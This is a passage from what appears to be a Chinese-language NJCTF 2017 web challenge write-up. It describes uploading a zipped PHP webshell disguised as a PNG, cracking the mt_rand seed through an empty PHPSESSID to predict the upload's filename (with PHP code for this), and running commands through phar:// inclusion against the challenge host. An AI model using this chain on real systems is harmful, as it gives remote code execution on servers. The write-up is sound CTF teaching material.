+<p style="max-width:100%;height:auto;">观察之后发现我们如果有文件名，我们可以通过将木马压缩进zip包，然后上传该zip文件(改成Png后缀上传)，利用phar伪协议包含执行命令。
+所以我们的核心就是搞到文件名，即想办法搞到<code style="max-width:100%;height:auto;">$seed</code>。
+这里我将一句话写进<code style="max-width:100%;height:auto;">0.php</code>，压缩之后改名为0.png上传
+然后至于这里的<code style="max-width:100%;height:auto;">session_id()</code>，我们通过设置<code style="max-width:100%;height:auto;">Cookie: PHPSESSID=;</code>就能让它为空，所以得到随机数的md5，解开后的值为<code style="max-width:100%;height:auto;">732946980</code>，通过这个<code style="max-width:100%;height:auto;">http://download.openwall.net/pub/projects/php_mt_seed/</code>工具解开得到</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c51e00d16a9b0d6300000c.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">然后通过这份代码</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
+    "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
+    "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
+    "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
+    "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+$seed=138844507;
+mt_srand($seed);
+$ss = mt_rand();
+$str="";
+for ($i = 1; $i &lt;= 32; ++$i) {
+    $ch = mt_rand(0, count($set) - 1);
+    $str .= $set[$ch];
+}
+echo $str;
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">生成文件名的前一部分为<code style="max-width:100%;height:auto;">iT3Bip2WzUVhBITZPZrfTVeZjgmrK1DQ</code>，加上我们上传的<code style="max-width:100%;height:auto;">0.png</code>,所以完整的文件路径为<code style="max-width:100%;height:auto;">/uP1O4Ds/iT3Bip2WzUVhBITZPZrfTVeZjgmrK1DQ_0.png</code>，然后访问
+<code style="max-width:100%;height:auto;">http://218.2.197.235:23735/?page=phar://uP1O4Ds/iT3Bip2WzUVhBITZPZrfTVeZjgmrK1DQ_0.png/0</code>，最后执行命令即可拿到flag。
+如下：
+<br/><img alt="" data-action="zoom" src="./NJCTF-2017-web-Writeup/58c51f67d16a9b0d6300000d.png" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./NJCTF-2017-web-Writeup/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./NJCTF-2017-web-Writeup/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./NJCTF-2017-web-Writeup/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./NJCTF-2017-web-Writeup/prism.js"></script>
+<script src="./NJCTF-2017-web-Writeup/zooming.js"></script>
+<script src="./NJCTF-2017-web-Writeup/Bendawang.js"></script>
+
+
